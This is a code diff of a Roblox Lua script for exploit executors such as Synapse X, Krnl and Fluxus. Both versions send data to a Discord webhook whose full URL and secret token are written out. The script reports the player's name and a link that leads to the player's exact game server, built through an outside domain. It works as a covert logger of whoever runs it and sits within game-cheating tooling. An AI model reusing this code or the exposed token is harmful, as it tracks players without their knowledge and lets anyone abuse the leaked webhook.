@@ -1,49 +1,37 @@
--- Executor-Compatible Discord Webhook Logger
-local webhookUrl = "https://discord.com/api/webhooks/1400361373925511208/HYF94vtFcyFPrrorZlYwOfhxekVHY7SZUjkbUkPNQi6e_8RMViWKKWyxaKLDcbbeWBav"
+-- Roblox Discord Logger (Executor Compatible)
 
-local serverId = game.JobId
-local playerName = game.Players.LocalPlayer.Name
+local player = game:GetService("Players").LocalPlayer
+local placeId = game.PlaceId
+local gameId = game.JobId
+local url = string.format("https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s", placeId, gameId)
+
+local webhook = "https://discord.com/api/webhooks/1400361373925511208/HYF94vtFcyFPrrorZlYwOfhxekVHY7SZUjkbUkPNQi6e_8RMViWKKWyxaKLDcbbeWBav"
 
 local data = {
-    content = "Server ID: " .. serverId, -- Message is just the server ID
-    username = playerName
+    username = "Roblox Logger",
+    embeds = {{
+        title = "Game Executed!",
+        description = string.format("Player **%s** executed the script.\n[Click to Copy URL](%s)", player.Name, url),
+        color = 16711680,
+        footer = { text = "Roblox Logger" }
+    }}
 }
 
 local jsonData = game:GetService("HttpService"):JSONEncode(data)
 
--- Executor detection
-local success, response = pcall(function()
-    if syn then
-        -- Synapse X
-        return syn.request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    elseif http then
-        -- Krnl
-        return http_request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    elseif request then
-        -- Sentinel
-        return request({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = jsonData
-        })
-    else
-        error("Unsupported executor")
-    end
-end)
+-- Executor compatible request
+local requestFunc = request or syn and syn.request or http_request or fluxus and fluxus.request
 
-if success then
-    print("✅ Webhook sent successfully with Server ID!")
+if requestFunc then
+    requestFunc({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+    print("Logged to Discord successfully!")
 else
-    warn("❌ Failed to send webhook: "..tostring(response))
+    warn("No compatible executor request function found.")
 end
